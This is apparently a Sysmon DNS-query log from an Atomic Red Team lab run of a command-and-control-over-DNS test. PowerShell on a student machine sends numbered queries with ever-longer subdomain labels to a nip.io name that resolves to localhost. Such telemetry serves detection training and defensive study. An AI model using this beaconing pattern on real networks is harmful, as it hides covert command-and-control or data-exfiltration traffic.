"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175337,"Query: 144.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamato.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.474","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175338,"Query: 145.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatom.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.512","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175339,"Query: 146.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomi.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.549","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.957 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175340,"Query: 147.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomic.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.589","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.957 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175341,"Query: 148.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicr.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.628","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.957 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175342,"Query: 149.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicre.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.666","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.957 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175343,"Query: 150.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicred.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.704","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.957 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175344,"Query: 151.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredt.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.743","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175345,"Query: 152.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.782","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175346,"Query: 153.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.at.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.820","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175347,"Query: 154.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.ato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.149","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175348,"Query: 155.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.186","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175349,"Query: 156.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.227","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175350,"Query: 157.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.267","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175351,"Query: 158.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.306","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175352,"Query: 159.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.345","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175353,"Query: 160.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.384","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175354,"Query: 161.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.422","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175355,"Query: 162.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.463","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:59.971 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175356,"Query: 163.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.500","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:00.984 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175357,"Query: 164.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.823","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:00.984 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175358,"Query: 165.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:59.992","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:00.984 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175359,"Query: 166.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:00.030","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:00.984 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175360,"Query: 167.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:00.069","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:00.984 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175361,"Query: 168.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:00.107","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:00.984 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175362,"Query: 169.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:00.146","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:00.984 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175363,"Query: 170.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:00.183","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:00.984 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175364,"Query: 171.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:00.362","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:00.984 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175365,"Query: 172.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:00.402","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:00.984 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175366,"Query: 173.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:00.440","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:01.999 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175367,"Query: 174.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:00.612","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:01.999 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175368,"Query: 175.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:00.653","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:05.707 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175369,"Query: 176.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:05.676","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:06.719 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175370,"Query: 177.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:05.697","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:06.719 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175371,"Query: 178.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:05.731","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:06.719 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175372,"Query: 179.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:05.769","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:06.719 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175373,"Query: 180.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:05.808","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:06.720 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175374,"Query: 181.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:05.845","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:06.720 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175375,"Query: 182.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:05.884","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:06.720 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175376,"Query: 183.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:06.212","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
